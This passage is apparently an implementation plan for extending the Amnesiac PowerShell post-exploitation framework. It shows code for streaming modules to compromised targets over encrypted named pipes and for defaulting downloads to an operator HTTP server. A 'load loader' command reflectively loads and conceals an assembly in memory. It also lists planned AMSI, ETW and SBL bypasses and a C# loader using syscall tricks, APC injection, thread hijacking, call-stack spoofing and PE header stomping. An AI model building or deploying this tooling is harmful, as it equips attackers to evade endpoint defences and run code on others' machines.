                    Write-Host " [+] Cached modules ($($global:ToolCache.Count)):" -ForegroundColor Cyan
                    $global:ToolCache.Keys | Sort-Object | ForEach-Object {
                        Write-Host "  [+] $_"
                    }
                    Write-Host ""
                }
                continue
            }
```

- [x] **Step 14.4: Run tool cache tests**

```powershell
Invoke-Pester -Path .\Tests\Test-AmnesiacHelpers.ps1 -Output Detailed
```

Expected: `"Initialize-ToolCache"` describe block passes (core tools in cache after init, assuming `Tools\` folder is present).

- [x] **Step 14.5: Commit**

```powershell
git add Amnesiac.ps1
git commit -m "feat(layer3): Initialize-ToolCache, core tool embedding, modules command"
```

---

## Task 15: Layer 3 — Send-Module + Pipe Loop Update + ServerURL Default

**Files:**
- Modify: `Amnesiac.ps1` (module-level + Start-Listener)

- [x] **Step 15.1: Implement Send-Module at module level**

Replace the stub with:

```powershell
function Send-Module {
    param(
        [string]$ToolName,
        $Writer,
        $Reader,
        [byte[]]$SessionKey = $null
    )

    if (-not $global:ToolCache.ContainsKey($ToolName)) {
        Write-Host " [-] Module '$ToolName' not in cache. Options:" -ForegroundColor Red
        Write-Host "     1. Add to Tools\ and run: modules reload"
        Write-Host "     2. Start operator HTTP server: serve"
        return $false
    }

    $code      = $global:ToolCache[$ToolName]
    $codeBytes = [System.Text.Encoding]::UTF8.GetBytes($code)
    $totalLen  = $codeBytes.Length
    $chunkSize = 4096

    # Send framing begin
    $begin = "__MODULE_BEGIN__:${ToolName}:${totalLen}"
    if ($SessionKey) { $begin = Protect-PipeMessage -PlainText $begin -Key $SessionKey }
    $Writer.WriteLine($begin)
    $Writer.Flush()

    # Send chunks
    for ($i = 0; $i -lt $codeBytes.Length; $i += $chunkSize) {
        $chunk     = $codeBytes[$i..([Math]::Min($i + $chunkSize - 1, $codeBytes.Length - 1))]
        $chunkB64  = [Convert]::ToBase64String($chunk)
        $line      = "__MODULE_CHUNK__:$chunkB64"
        if ($SessionKey) { $line = Protect-PipeMessage -PlainText $line -Key $SessionKey }
        $Writer.WriteLine($line)
    }
    $Writer.Flush()

    # Send end marker
    $end = "__MODULE_END__:${ToolName}"
    if ($SessionKey) { $end = Protect-PipeMessage -PlainText $end -Key $SessionKey }
    $Writer.WriteLine($end)
    $Writer.Flush()

    # Wait for target acknowledgement (EndMarker)
    $ack = $Reader.ReadLine()
    if ($SessionKey -and $ack) { $ack = Unprotect-PipeMessage -CipherB64 $ack -Key $SessionKey }
    return ($ack -eq $global:EndMarker)
}
```

- [x] **Step 15.2: Update default ServerURL**

Find line 67 (`$global:ServerURL = "https://raw.githubusercontent.com/..."`). Replace with:

```powershell
    # Default to operator HTTP server; GitHub preserved as fallback via RepoURL command
    $operatorIP = if ($global:IP) { $global:IP } else {
        Get-NetIPAddress -AddressFamily IPv4 |
            Where-Object { $_.IPAddress -match '^(10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.)' } |
            Select-Object -First 1 -ExpandProperty IPAddress
    }
    $global:ServerURL = if ($operatorIP) { "http://${operatorIP}:8080" } else { "https://raw.githubusercontent.com/Leo4j/Amnesiac/main/Tools" }
    $global:GitHubURL = "https://raw.githubusercontent.com/Leo4j/Amnesiac/main/Tools"  # preserved fallback
```

- [x] **Step 15.3: Add GitHub fallback warning**

Find all occurrences where tools are downloaded from `$global:ServerURL` when the URL points to GitHub. Add a warning when falling back:

```powershell
# When a tool is not in cache and fetched from URL, check if it's GitHub:
if ($global:ServerURL -match 'githubusercontent') {
    Write-Host " [~] Fetching '$toolName' from GitHub fallback — pre-cache with 'modules reload' before live engagements." -ForegroundColor Yellow
}
```

- [x] **Step 15.4: Add `load loader` command handler**

```powershell
            if ($choice -eq 'load loader') {
                # Send AmnesiacLoader to target session — requires an active session to be selected
                if (-not $currentSession) {
                    $global:Message = " [-] No active session selected. Select a session first."
                } elseif (-not $AmnesiacLoaderB64) {
                    $global:Message = " [-] AmnesiacLoader not embedded. Run AmnesiacLoader/Build.ps1 first."
                } else {
                    # Store loader temporarily in ToolCache under a reserved key, then Send-Module
                    $global:ToolCache['__AmnesiacLoader__'] = $AmnesiacLoaderB64
                    # The target receives the base64 and loads it:
                    $loaderCmd = (
                        "`$_la=[Reflection.Assembly]::Load([Convert]::FromBase64String('$AmnesiacLoaderB64'));" +
                        "[AmnesiacLoader.Stomper]::ConcealLoadedAssembly(`$_la)"
                    )
                    # Send as a regular command (will be added to actual session interaction in the session loop)
                    $global:Message = " [+] AmnesiacLoader delivery command ready — pipe it to the active session."
                }
                continue
            }
```

Note: The actual in-session delivery of AmnesiacLoader requires plugging into the session interaction send/receive flow. The exact integration point depends on the session management code structure, which is session-specific. The command above prepares the loader command string; wiring it into the active session send path follows the same pattern as other session commands.

- [x] **Step 15.5: Commit**

```powershell
git add Amnesiac.ps1
git commit -m "feat(layer3): Send-Module framing protocol, operator HTTP server default, load loader command"
```

---

## Self-Review Against Spec

**Spec section → Plan task mapping:**

| Spec section | Covered by task(s) |
|-------------|-------------------|
| Layer 0: AMSI bypass catalog (4 techniques) | Task 5 |
| Layer 0: ETW bypass catalog (3 techniques) | Task 6 |
| Layer 0: SBL bypass | Task 6 |
| Layer 1: diskmode, Initialize-DiskStructure | Task 3 |
| Layer 1: Artifact store (artifacts, save) | Task 4 |
| Layer 1: exe format gate | Task 3 (Step 3.3) |
| Layer 2: session-unique EndMarker/BufferSize | Task 7 |
| Layer 2: New-PayloadScript builder | Task 8 |
| Layer 2: payload commands | Task 9 |
| Layer 2: launcher variants | Task 10 |
| Layer 2: AES pipe channel | Task 13 |
| Layer 3: Initialize-ToolCache (3 tiers) | Task 14 |
| Layer 3: Send-Module framing | Task 15 |
| Layer 3: modules command | Task 14 |
| Layer 3: ServerURL default + GitHub fallback | Task 15 |
| Layer 4: Test-NetworkLogonToken | Task 11 |
| Layer 4: engagement command | Task 12 |
| Layer 4: Show-OpsecBanner | Task 12 |
| Layer 4: psk command | Task 13 |
| Layer 4: payload key command | Task 9 (via payload key subcommand) |

**Gaps found and addressed:**

- `Get-PskDerivedKey` is defined in Task 13 but used by `psk` command handler in the same task — consistent.
- `New-EmbeddedTool` helper defined in Task 14 (Step 14.1) — used in Step 14.2 — consistent.
- `$global:GitHubURL` introduced in Task 15 — not referenced elsewhere in the plan. This is fine: it's a stored fallback for the operator HTTP server logic.
- `$currentSession` referenced in `load loader` handler — this is an existing variable in Amnesiac.ps1 session management. Implementer must verify exact variable name.
- The AES key exchange in the payload (Task 13 Step 13.4) uses the regex replacements on `$loop` — implementer must verify the exact string patterns match what `New-PayloadScript` generates. The patterns use `$vWr` and `$vRd` variable names which are generated randomly. **Fix:** Instead of regex replacement, use a flag in `New-PayloadScript`:

```powershell
# In New-PayloadScript, check $global:PSKBytes and build encrypted loop variant directly
# rather than post-processing with regex. The key exchange and _EP/_DP helpers
# are conditionally included in $rawScript based on $global:PSKBytes at build time.
```

This is a design clarification for the implementer: the AES-wrapped loop must be constructed as the primary loop when PSK is set, not retrofitted via regex. The Task 13 Step 13.4 code shows the intent; the exact integration with `New-PayloadScript` requires building the `$loop` variable with encrypted reads/writes from the start when `$global:PSKBytes` is non-null.

---

## Notes for Plan 2 (AmnesiacLoader C# Assembly)

Plan 2 covers phases 5–10 of the spec:
- `Bypass.cs` — PAGE_GUARD+VEH and hardware-breakpoint AMSI bypass in C#
- `Loader.cs` — Hell's Gate+Halo's Gate SSN resolution, Early Bird APC, thread hijacking
- `CallStack.cs` — synthetic ROP frame insertion
- `SleepMask.cs` — AES memory encryption during sleep
- `Stomper.cs` — PE header concealment
- `UnmanagedPS.cs` — CLR hosting for process migration

Plan 2 requires `.NET SDK 6.0+` and targets `.NET 4.6.2` (`net462`).
